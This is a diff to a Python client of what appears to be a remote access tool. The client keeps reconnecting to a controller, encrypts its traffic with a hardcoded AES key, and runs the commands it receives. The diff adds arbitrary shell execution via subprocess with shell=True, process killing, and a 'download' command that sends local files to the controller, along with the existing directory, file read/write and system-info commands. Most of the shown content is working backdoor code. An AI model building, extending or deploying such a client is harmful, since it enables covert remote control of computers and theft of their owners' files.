@@ -6,30 +6,40 @@ import shutil
 import platform
 import psutil
 import random
+import time
+import subprocess
 
 
 #secret_key = os.urandom(BLOCK_SIZE) i generated once and i will use that always
 secret_key=b'b\x90\xf7\x1d\\KY\xc3\xd7\x13\xf1\x90\xba\xe4HS\xe3\xce\x1cd\x8f\xdf\xda\xc8u\xa9B\x85-&<\xb7'
 Initialization_vector = b'This is a testIV'#IV must be 16 bytes long
 
+def padding(message):
+        while(len(message)%16!=0):
+            message = message +" "
+        return  message.encode()
+
 def unpadding(message):
     while message.endswith(" "):
         message = message[:-1]
     return message
-
-def padding(message):
-        while(len(message.encode())%16!=0):
-            message = message +" "
-        return  message.encode()
     
+
 def encryption(messageToEncrypt):
-    obj = AES.new(secret_key, AES.MODE_CBC,Initialization_vector)
-    return obj.encrypt(messageToEncrypt)
-
+    try:
+        obj = AES.new(secret_key, AES.MODE_CBC,Initialization_vector)
+        return obj.encrypt(messageToEncrypt)
+    except Exception as e:
+        obj = AES.new(secret_key, AES.MODE_CBC,Initialization_vector)
+        return obj.encrypt(padding(e))
+    
 def decryption(ciphertext):
-    obj2 = AES.new(secret_key, AES.MODE_CBC,Initialization_vector)
-    return obj2.decrypt(ciphertext).decode()
-
+    try:
+        obj2 = AES.new(secret_key, AES.MODE_CBC,Initialization_vector)
+        return obj2.decrypt(ciphertext).decode()
+    except Exception as e:
+        return str(e)
+    
 def getCurrentWorkingDirectory():
     try:
         sending_message = os.getcwd()
@@ -145,7 +155,8 @@ def getIp():
         sending_message=("Connecting from: %s" %(r.text))
     except Exception as e:
         sending_message="Exception: " + str(e)
-    return  sending_message
+    finally:
+        return sending_message
 
 #Machine information
 def infoMethod():
@@ -179,7 +190,6 @@ def processesMethod():
    
     return message
 
-
 def getMessage(con):
     try:
         # get the length of the incoming data
@@ -191,20 +201,97 @@ def getMessage(con):
             if len(received_message)-len_data>1024:
                 received_message += decryption(con.recv(1024))
             else:
-                received_message += decryption(con.recv(len(received_message)-len_data))
-        while received_message.endswith(" "):
-                received_message = received_message[:-1]  
+                received_message += decryption(con.recv(len(received_message)-len_data))  
     except Exception as e:
         received_message="Exception: " + str(e)
-    return received_message  
+    return unpadding(received_message)  
 
+def processesKill(received_message):
+    if received_message.isdigit():
+        try:
+            p = psutil.Process(int(received_message[5:]))
+            p.kill()
+            sending_message = "Process deleted"
+        except Exception as e:
+            sending_message = str(e)
+        finally:
+            return sending_message    
+    else:
+        try:
+           for p in psutil.process_iter():
+            # check whether the process name matches
+                if p.name() == received_message[5:]:
+                    p.kill()
+           sending_message = "Processes deleted"
+        except Exception as e:
+            sending_message = str(e)
+        finally:
+            return sending_message  
 
+def sendFile(con,received_message):
+    try:
+        filename = received_message[9:] 
+        if(os.path.exists(filename)):
+            sending_message = filename
+            #send filename
+            sending_messages(con, sending_message)
+            #send filesize
+            filesize = os.path.getsize(filename)
+            sending_messages(con, str(filesize))
+            received_message = getMessage(con)
+            total = 0
+            if received_message == "ok 200":
+                f = open(filename,'rb')
+                while (total<filesize):
+                    if(filesize-total>1024):
+                        l = f.read(1024)
+                        con.send(l)
+                        print('Sent ',repr(l))
+                        total+=1024
+                    else:
+                        l = f.read(filesize-total)
+                        con.send(l)
+                        print('Sent ',repr(l))
+                        total+=filesize-total
+                
+                f.close()  
+                return "Finish"
+            else:
+                return "server respond badly"
+            
+        else:
+            sending_message = filename + " does not exist!"
+            return sending_message
+    except Exception as e:
+        sending_message="Exception: " + str(e)
+        return sending_message
+    
+def sending_messages(con, sending_message):
+    #client send back data
+    print("This is the message that's about to be send: ", sending_message)
+    padded_message = padding(sending_message)
+    sending_message = encryption(padded_message)
+    print(" this is message len" ,len(padded_message))
+        
+    con.send(encryption(padding(str(len(sending_message)))))
+    con.sendall(sending_message)
+
+def sub_process(received_message):
+    try:
+        sending_message = subprocess.check_output(received_message[4:], shell=True ).decode('utf-8')
+    except Exception as e:
+        sending_message = str(e)
+    finally:
+        return sending_message
+
+            
 def client():
 
     #Creating the socket passing the ip and port as parameters and trying to connect
     host = "127.0.0.1"
     port = 5000
     con = socket.socket()
+    con.settimeout(60) 
     con.connect((host,port))
     received_message=""
     #auth
@@ -222,9 +309,9 @@ def client():
     con.send(encryption(padding(getIp())))
 
     
-    while received_message != 'close_this_socket':
+    while received_message != 'close':
         received_message = getMessage(con)
-        
+        print(received_message)
         if received_message == "pwd":
            sending_message = getCurrentWorkingDirectory()
         elif received_message[0:2] == "cd":
@@ -245,8 +332,9 @@ def client():
            sending_message = readFile(con,received_message)
         elif received_message[0:5] == "write":
            sending_message = writeToFile(con,received_message)
-        #elif(received_message[0:8]=="download"):
-        #   sending_message = sendFile(con,received_message)
+        elif(received_message[0:8]=="download"):
+           sending_message = sendFile(con,received_message)
+           print(sending_message)
         #  received_message = getMessage(con)
         #elif(received_message[0:6]=="upload"):
         #   sending_message = getFile(con,received_message)
@@ -257,23 +345,23 @@ def client():
            sending_message = infoMethod()
         elif(received_message=="processes"):
            sending_message = processesMethod()
+        elif(received_message[0:4]=="kill"):
+           sending_message = processesKill(received_message)
+        elif(received_message[0:4]=="cmd "):
+            sending_message = sub_process(received_message)
         else:
-           sending_message = "use help"     
+           sending_message = "Use help"     
         
-        
-        #client send back data
-        print("This is the message that's about to be send: " + sending_message)
-        padded_message = padding(sending_message)
-        sending_message = encryption(padded_message)
-        print(" this is message len" ,len(padded_message))
-        
-        con.send(encryption(padding(str(len(sending_message)))))
-        con.sendall(sending_message)
+        sending_messages(con, sending_message)
         print("message send")
 
     con.close()    
         
 if __name__ == "__main__":
-    client()
+     while True:
+        try:
+            client()
+        except:
+            time.sleep(15) # sleep for 100 seconds before retrying to connect
         
 
